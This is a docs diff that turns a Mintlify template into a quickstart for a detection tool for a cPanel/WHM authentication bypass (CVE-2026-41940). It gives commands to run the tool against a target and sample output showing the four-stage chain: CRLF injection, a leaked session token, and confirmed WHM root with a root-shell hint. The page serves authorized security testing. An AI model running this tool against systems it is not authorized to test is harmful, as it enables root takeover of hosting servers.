@@ -1,81 +1,101 @@
 ---
-title: "Quickstart"
-description: "Start building awesome documentation in minutes"
-icon: 'rocket'
+title: "Get started with the cPanel/WHM auth bypass detector"
+description: "Run the CVE-2026-41940 detection tool against a cPanel/WHM target in under 5 minutes. Includes installation, dependencies, and sample output."
 ---
 
-## Get started in three steps
+This guide walks you through detecting whether a cPanel/WHM server is vulnerable to CVE-2026-41940 — an authentication bypass that allows an unauthenticated attacker to gain root-level WHM access. You'll go from a fresh clone to a confirmed detection result in under 5 minutes.
 
-Get your documentation site running locally and make your first customization.
+<Warning>
+  This tool is for authorized security testing only. Run it exclusively against systems you own or have explicit written permission to test. Unauthorized use is illegal and unethical.
+</Warning>
 
-### Step 1: Set up your local environment
+<Steps>
+  <Step title="Clone the repository">
+    Clone the watchTowr detection script from GitHub:
 
-<AccordionGroup>
-  <Accordion icon="copy" title="Clone your docs locally">
-    During the onboarding process, you created a GitHub repository with your docs content if you didn't already have one. You can find a link to this repository in your [dashboard](https://dashboard.mintlify.com).
-    
-    To clone the repository locally so that you can make and preview changes to your docs, follow the [Cloning a repository](https://docs.github.com/en/repositories/creating-and-managing-repositories/cloning-a-repository) guide in the GitHub docs.
-  </Accordion>
-  <Accordion icon="rectangle-terminal" title="Start the preview server">
-    1. Install the Mintlify CLI: `npm i -g mint`
-    2. Navigate to your docs directory and run: `mint dev`
-    3. Open `http://localhost:3000` to see your docs live!
-    
-    <Tip>Your preview updates automatically as you edit files.</Tip>
-  </Accordion>
-</AccordionGroup>
+    ```bash
+    git clone https://github.com/watchtowrlabs/watchTowr-vs-cPanel-WHM-AuthBypass-to-RCE.py
+    cd watchTowr-vs-cPanel-WHM-AuthBypass-to-RCE.py
+    ```
+  </Step>
 
-### Step 2: Deploy your changes
+  <Step title="Install dependencies">
+    The tool requires the `requests` library for HTTP and `urllib3` for SSL warning suppression. Install both with pip:
 
-<AccordionGroup>
-  <Accordion icon="github" title="Install our GitHub app">
-    Install the Mintlify GitHub app from your [dashboard](https://dashboard.mintlify.com/settings/organization/github-app).
-    
-    Our GitHub app automatically deploys your changes to your docs site, so you don't need to manage deployments yourself.
-</Accordion>
-<Accordion icon="palette" title="Update your site name and colors">
-    For a first change, let's update the name and colors of your docs site.
+    ```bash
+    pip install requests urllib3
+    ```
+  </Step>
 
-    1. Open `docs.json` in your editor.
-    2. Change the `"name"` field to your project name.
-    3. Update the `"colors"` to match your brand.
-    4. Save and see your changes instantly at `http://localhost:3000`.
+  <Step title="Run the tool against your target">
+    Point the tool at a WHM instance using the `--target` flag. The default WHM port is `2087`:
 
-    <Tip>Try changing the primary color to see an immediate difference!</Tip>
-  </Accordion>
-</AccordionGroup>
+    ```bash
+    python watchTowr-vs-cPanel-WHM-AuthBypass-to-RCE.py --target https://target:2087/
+    ```
 
-### Step 3: Go live
+    If your target's WHM hostname differs from the IP you're connecting to, you can override the `Host` header manually:
 
-<Accordion icon="rocket" title="Publish your docs">
-  1. Commit and push your changes.
-  2. Your docs will update and be live in moments!
-</Accordion>
+    ```bash
+    python watchTowr-vs-cPanel-WHM-AuthBypass-to-RCE.py --target https://target:2087/ --hostname whm.example.com
+    ```
+  </Step>
+
+  <Step title="Interpret the output">
+    A successful detection against a vulnerable host looks like this:
+
+    ```
+                         __         ___  ___________
+             __  _  ______ _/  |__ ____ |  |_\__    ____\____  _  ________
+             \ \/ \/ \__  \    ___/ ___\|  |  \|    | /  _ \ \/ \/ \_  __ \
+              \     / / __ \|  | \  \___|   Y  |    |(  <_> \     / |  | \/
+               \/\_/ (____  |__|  \___  |___|__|__  | \__  / \/\_/  |__|
+                              \/          \/     \/
+
+            watchTowr-vs-cPanel-WHM-AuthBypass-to-RCE.py
+
+            (*) cPanel/WHM Authentication Bypass - Detection Artifact Generator
+
+              - Sina Kheirkhah (@SinSinology) of watchTowr (@watchTowrcyber)
+
+            CVEs: [cve-2026-41940]
+
+    [0] hostname = whm.example.com
+    [1] minting a preauth session...
+        session base = :vQ2WC5Bexp0oFSa7
+    [2] sending the CRLF injection (Basic auth + no-ob cookie)...
+        HTTP 307, leaked token = /cpsess5691070609
+    [3] firing do_token_denied to propagate raw -> cache...
+        HTTP 401, gadget fired
+    [4] verifying we're WHM root...
+        /json-api/version -> HTTP 200  {"version":"11.110.0.89"}
+
+    [+] now just login to https://target:2087/ and use the terminal option to get a root shell
+    ```
+
+    Each numbered stage corresponds to a phase of the exploit chain: session minting, CRLF injection, cache propagation, and root verification.
+  </Step>
+</Steps>
+
+<Note>
+  **Vulnerable system:** Stage 4 returns `HTTP 200` with a `"version"` field in the JSON body, and the tool prints the `[+]` confirmation line. A 500 or 503 response mentioning `License` also indicates the auth bypass succeeded — the server is just license-gated.
+
+  **Patched system:** Stage 2 will fail with `no /cpsess token leaked` and exit early. No token is issued because the CRLF injection is blocked.
+</Note>
 
 ## Next steps
 
-Now that you have your docs running, explore these key features:
-
 <CardGroup cols={2}>
-
-<Card title="Write Content" icon="pen-to-square" href="/essentials/markdown">
-  Learn MDX syntax and start writing your documentation.
-</Card>
-
-<Card title="Customize style" icon="palette" href="/essentials/settings">
-  Make your docs match your brand perfectly.
-</Card>
-
-<Card title="Add code examples" icon="square-code" href="/essentials/code">
-  Include syntax-highlighted code blocks.
-</Card>
-
-<Card title="API documentation" icon="code" href="/api-reference/introduction">
-  Auto-generate API docs from OpenAPI specs.
-</Card>
-
+  <Card title="Installation" icon="wrench" href="/installation">
+    Full setup details, Python version requirements, and virtual environment tips.
+  </Card>
+  <Card title="Basic usage" icon="terminal" href="/usage/basic-usage">
+    All available flags, target formats, and how to run the tool correctly.
+  </Card>
+  <Card title="Output interpretation" icon="magnifying-glass" href="/usage/output-interpretation">
+    Understand every line of tool output and what it means for your target.
+  </Card>
+  <Card title="Exploit chain" icon="link" href="/technical/exploit-chain">
+    A technical walkthrough of the four-stage authentication bypass.
+  </Card>
 </CardGroup>
-
-<Note>
-  **Need help?** See our [full documentation](https://mintlify.com/docs) or join our [community](https://mintlify.com/community).
-</Note>
